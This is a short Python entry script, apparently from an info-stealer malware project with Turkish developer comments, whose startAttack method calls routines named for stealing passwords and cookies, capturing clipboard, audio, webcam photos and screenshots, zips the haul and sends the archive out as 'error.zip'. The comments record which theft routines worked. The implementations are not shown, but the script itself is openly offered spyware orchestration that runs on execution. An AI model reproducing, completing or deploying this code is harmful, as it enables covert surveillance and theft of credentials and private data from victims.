from functions import Functions
from zipFile import ZipFile

zipFile = ZipFile()
Functions = Functions()

class Main:
    def startAttack(self):
        try:
            #Functions.stealTasklist() # çalıştı
            #Functions.clipboard() # çalıştı
            #Functions.voice() # çalıştı
            #Functions.take_photo() # çalıştı
            Functions.take_screenshoot() # çalışmadı hata veriyor
            #Functions.listdir() # çalıştı
            #Functions.get_pwd() # çalıştı
            #Functions.StealPasswords() # çalıştı
            #Functions.StealCookies() # çalıştı

            ZipFile.ZipFile()

            Functions.send_zip_file("error.zip")

        except Exception as e:
            print(f"Error! {e}")

Main = Main()
Main.startAttack()